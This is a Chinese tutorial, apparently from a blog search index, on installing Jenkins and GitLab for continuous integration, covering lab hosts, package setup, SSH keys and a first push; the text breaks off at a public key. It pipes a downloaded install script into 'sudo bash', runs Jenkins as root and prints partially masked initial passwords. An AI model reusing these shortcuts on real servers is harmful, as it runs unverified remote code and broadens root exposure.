<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Jenkins+gitlab持续集成</title>
    <link href="/2025/04/15/Jenkins-gitlab%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/"/>
    <url>/2025/04/15/Jenkins-gitlab%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/</url>
    
    <content type="html"><![CDATA[<p> 之前我们已经部署了k8s和harbor仓库，本次来部署下jenkins和gitlab实现持续集成。</p><p><strong>概念</strong></p><p>持续集成是开发团队通过将代码的不同部分集成到共享存储库中，并频繁地进行构建和测试，以确保代码的一致性和稳定性。</p><p><strong>流程</strong><br> 在现在的开发模式中，一般的项目，协同开发是离不开的，这就涉及到多个开发人员编写处理自己负责的功能模块或者某些开发人员共同负责一个模块。于是，通过版本控制系统可以将各个开发人员的代码集成在该共享存储库里，在存储库里，每个开发人员根据需求的不同来创建对应的分支，在完成需求后，每个人都需要提交合并将开发分支代码集成在一起，这就需要解决代码冲突，并且如何除了code review之外如何确保这些更改对应用没有产生影响，一旦提交请求合并到主分支，自动化构建工具就会根据流程自动编译构建安装应用，并执行单元测试框架的自动化测试来校验提交的修改。</p><h2 id="机器规划如下"><a href="#机器规划如下" class="headerlink" title="机器规划如下"></a>机器规划如下</h2><table><thead><tr><th>服务器名称</th><th>IP地址</th><th>配置</th></tr></thead><tbody><tr><td>jenkins211</td><td>10.0.0.211</td><td>2核，4GiB，系统盘 20GiB</td></tr><tr><td>gitlab212</td><td>10.0.0.212</td><td>4核，4GiB，系统盘 20GiB</td></tr></tbody></table><h2 id="一、部署jenkins"><a href="#一、部署jenkins" class="headerlink" title="一、部署jenkins"></a>一、部署jenkins</h2><p><strong>1.下载jenkins</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://mirrors.jenkins-ci.org/debian/<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p><strong>2.准备jenkins部署环境</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">1 部署Jenkins的秘钥<br>[root@jenkins211 ~]# <span class="hljs-built_in">sudo</span> wget -O /usr/share/keyrings/jenkins-keyring.asc \<br>    https://pkg.jenkins.io/debian/jenkins.io-2023.key<br><br>2 添加Jenkins的存储库<br>[root@jenkins211 ~]# <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb [signed-by=/usr/share/keyrings/jenkins-keyring.asc]&quot;</span> \<br>    https://pkg.jenkins.io/debian binary/ | <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> \<br>    /etc/apt/sources.list.d/jenkins.list &gt; /dev/null<br><br>3 安装JRE环境(在线安装很慢，一般提前下载好jdk)<br>[root@jenkins211 ~]# <span class="hljs-built_in">sudo</span> apt-get update<br>  <span class="hljs-built_in">sudo</span> apt-get install fontconfig openjdk-17-jre<br>  <span class="hljs-built_in">sudo</span> apt-get install jenkins  <br><br>4 创建jdk安装目录，解压到指定目录<br>[root@jenkins211 ~]# <span class="hljs-built_in">mkdir</span> -pv /softwares<br>[root@jenkins211 ~]# tar xf jdk-17_linux-x64_bin.tar.gz -C /softwares/<br><br><br>5 配置jdk环境变量<br>[root@jenkins211 ~]# vim .bashrc<br>...<br><span class="hljs-built_in">export</span> JAVA_HOME=/softwares/jdk-17.0.8<br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:<span class="hljs-variable">$JAVA_HOME</span>/bin<br><br>[root@jenkins211 ~]# <span class="hljs-built_in">source</span> .bashrc <br><br>6 验证jdk是否生效<br>[root@jenkins211 ~]# java --version<br>openjdk 17.0.13 2024-10-15<br>OpenJDK Runtime Environment (build 17.0.13+11-Ubuntu-2ubuntu122.04)<br>OpenJDK 64-Bit Server VM (build 17.0.13+11-Ubuntu-2ubuntu122.04, mixed mode, sharing)<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p><strong>3.部署jenkins</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">安装jenkins<br>[root@jenkins211 ~]# dpkg -i jenkins_2.489_all.deb <br><span class="hljs-comment"># apt-get install jenkins #这种在线方式安装较慢，不建议。</span><br><br>修改jenkins的启动脚本并重启服务<br>[root@jenkins211 ~]# vim /lib/systemd/system/jenkins.service<br>......<br>User=root<br>Group=root<br><br>...<br>Environment=<span class="hljs-string">&quot;JENKINS_HOME=/var/lib/jenkins&quot;</span><br><span class="hljs-comment"># 找到上面一行后添加如下一行</span><br>Environment=<span class="hljs-string">&quot;JAVA_HOME=/oldboyedu/softwares/jdk-17.0.8&quot;</span><br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p><strong>4.访问jenkins地址</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://10.0.0.211:8080/login?from=%2F<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/e1515ec05a604141a51fb41866f3b4f8.png" alt="e1515ec05a604141a51fb41866f3b4f8.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"><strong>5.查看密码</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@jenkins211 ~]# <span class="hljs-built_in">cat</span> /var/lib/jenkins/secrets/initialAdminPassword<br>88259fc092c34ded983b6917872****d<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p><strong>6.安装jenkins插件</strong></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/fb5658f33a674aaf8f16a7198b9da4e5.png" alt="fb5658f33a674aaf8f16a7198b9da4e5.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"><strong>7.创建用户</strong></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/105460e20071422b84d3861c09145a54.png" alt="105460e20071422b84d3861c09145a54.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"><strong>好啦，就这样jenkins就简简单单部署完成了</strong></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/5c919d64bb60497db248332c7ba4d376.png" alt="5c919d64bb60497db248332c7ba4d376.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>8.修改时区</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs swift">[root<span class="hljs-meta">@jenkins211</span> <span class="hljs-operator">~</span>]# ln <span class="hljs-operator">-</span>svf <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/zoneinfo/</span><span class="hljs-type">Asia</span><span class="hljs-regexp">/Shanghai /</span>etc<span class="hljs-operator">/</span>localtime<br>&#x27;<span class="hljs-regexp">/etc/</span>localtime&#x27; -&gt; &#x27;<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/zoneinfo/</span><span class="hljs-type">Asia</span><span class="hljs-operator">/</span><span class="hljs-type">Shanghai</span>&#x27;<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p><img src="/Untitled.assets/b6d8f708686a4daf973f86a9fb8c4fcc.png" alt="b6d8f708686a4daf973f86a9fb8c4fcc.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>9.修改jenkins软件源</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift">[root<span class="hljs-meta">@jenkins211</span> <span class="hljs-operator">~</span>]# sed <span class="hljs-operator">-</span>i.bak &#x27;s#updates.jenkins.io<span class="hljs-regexp">/download#mirror.tuna.tsinghua.edu.cn/</span>jenkins#g&#x27; <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/jenkins/</span>updates<span class="hljs-operator">/</span><span class="hljs-keyword">default</span>.json<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>10.修改搜索引擎</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart">[root<span class="hljs-meta">@jenkins</span>211 ~]# sed -i <span class="hljs-string">&#x27;s#www.google.com#www.baidu.com#g&#x27;</span> /<span class="hljs-keyword">var</span>/lib/jenkins/updates/<span class="hljs-keyword">default</span>.json<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>11.替换jenkins国内下载地址</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/2e48d1b82ed74ec0971cfbdf1214a888.png" alt="2e48d1b82ed74ec0971cfbdf1214a888.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p> 拉到最下面替换url</p><blockquote><p>将升级站点URL替换成国内镜像地址<br> <a href="https://mirror.tuna.tsinghua.edu.cn/jenkins/updates/update-center.json">https://mirror.tuna.tsinghua.edu.cn/jenkins/updates/update-center.json</a></p></blockquote><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://gitee.com/ljh00928/csdn/raw/master/img/9ae3dd35c62e4146a54b59671f70bf2d.png" alt="9ae3dd35c62e4146a54b59671f70bf2d.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></h2><p>12.重新登录jenkins</p><blockquote><p><a href="http://10.0.0.211:8080/restart">http://10.0.0.211:8080/restart</a></p></blockquote><h2 id="二、部署gitlab"><a href="#二、部署gitlab" class="headerlink" title="二、部署gitlab"></a>二、部署gitlab</h2><p>参考地址：<a href="https://about.gitlab.com/install/#ubuntu">https://about.gitlab.com/install/#ubuntu</a></p><p>\1. 安装并配置必要的依赖项</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get update<br>apt-get install -y curl openssh-server ca-certificates tzdata perl<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>2.安装 Postfix</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get install -y postfix<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>3.添加 GitLab 包仓库并安装包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://packages.gitlab.com/install/repositories/gitlab/gitlab-ee/script.deb.sh | <span class="hljs-built_in">sudo</span> bash<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>4.安装 GitLab 包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#url替换成自己本机的ip地址</span><br>EXTERNAL_URL=<span class="hljs-string">&quot;http://10.0.0.212&quot;</span> apt-get install gitlab-ee<br><br><span class="hljs-comment">#也可以选择离线部署</span><br>https://packages.gitlab.com/gitlab/gitlab-ce<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>5.查看密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@gitlab212 ~]# <span class="hljs-built_in">cat</span> /etc/gitlab/initial_root_password<br>....<br>Password: 8Et747zZeK0xKnx4gJ03HP+5MQ00yv4v3rzjy1a***=<br>....<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>6.登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">账号：root<br>密码：查看生成的密码<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/a7d21a5248714edf8437ae6646f79ff3.png" alt="a7d21a5248714edf8437ae6646f79ff3.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>7.设置语言</p><p>点击偏好设置</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/ea6267f5b46a4537a65173d42916acad.png" alt="ea6267f5b46a4537a65173d42916acad.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>选择中文–&gt;保存</p><p><img src="/Untitled.assets/2c004cf24a564d328fea29af1008bd8a.png" alt="2c004cf24a564d328fea29af1008bd8a.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">8.开启本地网络请求</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/aaf8e8f036024678a602c833150fc730.png" alt="aaf8e8f036024678a602c833150fc730.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h2 id="三、gitlab集成jenkins"><a href="#三、gitlab集成jenkins" class="headerlink" title="三、gitlab集成jenkins"></a>三、gitlab集成jenkins</h2><p>1.创建群组</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/9d9589fef0c24fde925ab1874fbd4a99.png" alt="9d9589fef0c24fde925ab1874fbd4a99.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>2.新建项目</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/9fda0fb6a0e74337b433cc67a415c1ef.png" alt="9fda0fb6a0e74337b433cc67a415c1ef.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/81ea81153b4a47d985cb4f2d7c31835a.png" alt="81ea81153b4a47d985cb4f2d7c31835a.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>3.添加ssh密钥</p><p>服务器和代码仓库连接方式有两种</p><p>第一种: 基于用户名和密码的方式连接</p><p>第二种: 基于SSH免秘钥方式(和命令行的SSH免秘钥相同)</p><p>我们使用基于免秘钥方式: 方便+安全性高</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">[root<span class="hljs-meta">@gitlab212</span> ~]<span class="hljs-comment"># ssh-keygen     #生成密钥对</span><br>Generating public/private ed25519 key pair.<br>Enter file in which to save the key (/root/.ssh/id_ed25519): <br>Enter passphrase (empty for no passphrase): <br>Enter same passphrase again: <br>Your identification has been saved in /root/.ssh/id_ed25519<br>Your public key has been saved in /root/.ssh/id_ed25519.pub<br>The key fingerprint is:<br>SHA256:GMd0qYCfisI7YgnL9gaTOvhSg9VWYVOtJ/ZmClhYCPc root<span class="hljs-meta">@gitlab212</span><br>The key&#x27;s randomart image is:<br>+--[ED25519 256]--+<br>|<span class="hljs-string">  ...o+oo...     </span>|<br>|<span class="hljs-string">   .oo++ .o      </span>|<br>|<span class="hljs-string">   . =Eooo       </span>|<br>|<span class="hljs-string">  . + ++= .      </span>|<br>|<span class="hljs-string">.o.o +..S+       </span>|<br>|<span class="hljs-string">+=+ o .   +      </span>|<br>|<span class="hljs-string">=+=.   . +       </span>|<br>|<span class="hljs-string">BB .    .        </span>|<br>|<span class="hljs-string">++=.             </span>|<br>+----[SHA256]-----+<br>[root<span class="hljs-meta">@gitlab212</span> ~]<span class="hljs-comment"># </span><br>[root<span class="hljs-meta">@gitlab212</span> ~]<span class="hljs-comment"># ll .ssh/</span><br>total 16<br>drwx------ 2 root root 4096 Dec 17 07:57 ./<br>drwx------ 4 root root 4096 Dec 15 12:01 ../<br>-rw------- 1 root root    0 Jul 23 16:40 authorized_keys<br>-rw------- 1 root root  411 Dec 17 07:57 id_ed25519        <span class="hljs-comment">#私钥</span><br>-rw-r--r-- 1 root root   96 Dec 17 07:57 id_ed25519.pub    <span class="hljs-comment">#公钥</span><br>[root<span class="hljs-meta">@gitlab212</span> ~]<span class="hljs-comment"># cat .ssh/id_rsa.pub </span><br>cat: .ssh/id_rsa.pub: No such file or directory<br>[root<span class="hljs-meta">@gitlab212</span> ~]<span class="hljs-comment"># cat .ssh/id_ed25519.pub</span><br>ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILkNNA0/prl380e574O6+cfOSOAbpeJl+zhEdS5e58 root<span class="hljs-meta">@gitlab212</span><br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p> 4.将公钥贴近gitlab</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/e5a3ce30996d414287f7cf26d27d9e9c.png" alt="e5a3ce30996d414287f7cf26d27d9e9c.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>添加公钥</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/20fd10f4b6214e02937eeb464ae75025.png" alt="20fd10f4b6214e02937eeb464ae75025.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"> 4.推送代码</p><p>配置邮箱</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">git config <span class="hljs-attr">--local</span> user<span class="hljs-selector-class">.name</span> <span class="hljs-string">&quot;liangjh&quot;</span><br>git config <span class="hljs-attr">--local</span> user<span class="hljs-selector-class">.email</span> <span class="hljs-string">&quot;3101306637@qq.com&quot;</span><br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>创建仓库</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs tap"><span class="hljs-comment">#上传代码到服务器</span><br>[root@gitlab212 project]<span class="hljs-comment"># pwd</span><br>/root/project<br>[root@gitlab212 project]<span class="hljs-comment"># ll</span><br>total 228<br>drwxr-xr-x<span class="hljs-number"> 6 </span>root root <span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 17 </span>08:09 ./<br>drwx------<span class="hljs-number"> 5 </span>root root <span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 17 </span>08:06 ../<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 16458 </span>Jun<span class="hljs-number"> 13 </span><span class="hljs-number"> 2019 </span>about.html<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 20149 </span>Jun<span class="hljs-number"> 13 </span><span class="hljs-number"> 2019 </span>album.html<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 19662 </span>Jun<span class="hljs-number"> 13 </span><span class="hljs-number"> 2019 </span>article_detail.html<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 18767 </span>Jun<span class="hljs-number"> 13 </span><span class="hljs-number"> 2019 </span>article.html<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 18913 </span>Jun<span class="hljs-number"> 13 </span><span class="hljs-number"> 2019 </span>comment.html<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 16465 </span>Jun<span class="hljs-number"> 13 </span><span class="hljs-number"> 2019 </span>contact.html<br>drwxr-xr-x<span class="hljs-number"> 2 </span>root root <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 19 </span><span class="hljs-number"> 2022 </span>css/<br>drwxr-xr-x<span class="hljs-number"> 7 </span>root root <span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 17 </span>08:07 .git/<br>drwxr-xr-x<span class="hljs-number"> 5 </span>root root <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 19 </span><span class="hljs-number"> 2022 </span>images/<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 29627 </span>Jun<span class="hljs-number"> 29 </span><span class="hljs-number"> 2019 </span>index.html<br>drwxr-xr-x<span class="hljs-number"> 2 </span>root root <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 19 </span><span class="hljs-number"> 2022 </span>js/<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 24893 </span>Jun<span class="hljs-number"> 13 </span><span class="hljs-number"> 2019 </span>product_detail.html<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 20672 </span>Jun<span class="hljs-number"> 13 </span><span class="hljs-number"> 2019 </span>product.html<br><br><br>git clone git@10.0.0.212:ops/project.git<br>cd project<br>git switch --create main<br><br><span class="hljs-comment">#提交全部代码到缓存区</span><br>[root@gitlab212 project]<span class="hljs-comment"># git add .    </span><br><br><span class="hljs-comment">#提交到远程仓库</span><br>[root@gitlab212 project]<span class="hljs-comment"># git commit -m &quot;第一次提交&quot;</span><br><br><span class="hljs-comment">#查看分支</span><br>[root@gitlab212 project]<span class="hljs-comment"># git branch</span><br><br><span class="hljs-comment">#推送到master分支</span><br>[root@gitlab212 project]<span class="hljs-comment"># git push -u origin master</span><br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>5.gitlab查看</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/1d5f28d411084e1e9bd09a9e30a5c7ab.png" alt="1d5f28d411084e1e9bd09a9e30a5c7ab.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h2 id="四、配置jenkins和gitlab免密"><a href="#四、配置jenkins和gitlab免密" class="headerlink" title="四、配置jenkins和gitlab免密"></a>四、配置jenkins和gitlab免密</h2><p>1.jenkins生成密钥对</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">[root<span class="hljs-meta">@jenkins211</span> ~]<span class="hljs-comment"># ssh-keygen</span><br>Generating public/private rsa key pair.<br>Enter file in which to save the key (/root/.ssh/id_rsa): <br>Enter passphrase (empty for no passphrase): <br>Enter same passphrase again: <br>Your identification has been saved in /root/.ssh/id_rsa<br>Your public key has been saved in /root/.ssh/id_rsa.pub<br>The key fingerprint is:<br>SHA256:8f0e/2XSZCdAGULp+LEkvVjeFo7YVJWv7HDFQDzfi1I root<span class="hljs-meta">@jenkins211</span><br>The key&#x27;s randomart image is:<br>+---[RSA 3072]----+<br>|<span class="hljs-string">         .o.o*o. </span>|<br>|<span class="hljs-string">          .oo =  </span>|<br>|<span class="hljs-string">        .+ ..  *.</span>|<br>|<span class="hljs-string">        ooB..E  *</span>|<br>|<span class="hljs-string">        S@.Boooo=</span>|<br>|<span class="hljs-string">        o B.=o+*.</span>|<br>|<span class="hljs-string">           ..++ +</span>|<br>|<span class="hljs-string">             ..=.</span>|<br>|<span class="hljs-string">              . +</span>|<br>+----[SHA256]-----+<br>[root<span class="hljs-meta">@jenkins211</span> ~]<span class="hljs-comment"># </span><br>[root<span class="hljs-meta">@jenkins211</span> ~]<span class="hljs-comment"># cat .ssh/id_rsa.pub </span><br>ssh-rsa 